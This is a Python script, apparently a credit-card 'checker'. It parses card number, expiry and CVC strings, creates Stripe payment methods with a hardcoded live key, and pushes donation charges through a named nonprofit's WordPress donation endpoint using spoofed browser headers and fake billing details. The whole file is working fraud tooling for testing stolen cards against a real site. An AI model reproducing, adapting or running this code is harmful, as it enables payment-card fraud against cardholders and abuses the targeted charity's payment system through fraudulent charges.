import requests, re
import random

def Tele(ccx):
    ccx = ccx.strip()
    n = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3]
    if "20" in yy: # Mo3gza
        yy = yy.split("20")[1]
    
    r = requests.session()
    
    random_amount1 = random.randint(1, 4)
    random_amount2 = random.randint(1, 99)

    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 14; 2109119BC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    }

    data = f'type=card&billing_details[name]=John+Steve&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2Fc264a67020%3B+stripe-js-v3%2Fc264a67020%3B+card-element&key=pk_live_X8I5Jg4Cf3h2FfLSP7fZ2JwS'

    response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)

    pm = response.json()['id']

    headers = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Origin': 'https://www.massairspace.org',
        'Referer': 'https://www.massairspace.org/donate/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 14; 2109119BC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
    }

    data = {
        'action': 'wp_full_stripe_inline_donation_charge',
        'wpfs-form-name': 'inline-donations',
        'wpfs-form-get-parameters': '%7B%7D',
        'wpfs-custom-amount': 'other',
        'wpfs-custom-amount-unique': '1',
        'wpfs-donation-frequency': 'one-time',
        'wpfs-billing-name': 'Jonas',
        'wpfs-billing-address-line-1': '123 street',
        'wpfs-billing-address-line-2': '',
        'wpfs-billing-address-city': 'NewYork',
        'wpfs-billing-address-state': 'NewYork',
        'wpfs-billing-address-zip': '10080',
        'wpfs-billing-address-country': 'US',
        'wpfs-card-holder-email': 'jhsha510@gmail.com',
        'wpfs-card-holder-name': 'John Steve',
        'wpfs-stripe-payment-method-id': f'{pm}',
    }

    response = requests.post('https://www.massairspace.org/wp-admin/admin-ajax.php', headers=headers, data=data)

    result = response.json()['message']
    
    return result
